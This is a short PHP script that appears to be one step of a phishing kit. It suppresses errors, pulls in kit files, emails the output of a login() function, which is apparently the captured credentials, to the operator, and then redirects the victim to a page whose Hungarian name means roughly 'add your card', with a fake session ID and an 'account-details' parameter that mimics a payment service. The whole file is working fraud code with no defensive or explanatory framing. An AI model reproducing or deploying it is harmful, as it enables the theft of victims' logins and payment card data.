<?php 
session_start();
error_reporting(0);
include("cc/mad.php");
include("./obito.php");

mail( login());

$x=md5(microtime());$xx=sha1(microtime());
echo "<script> window.top.location.href = './_addhozzaakartyad.php?cmd=_account-details&session=".$x.$xx."';   </script>";

 ?>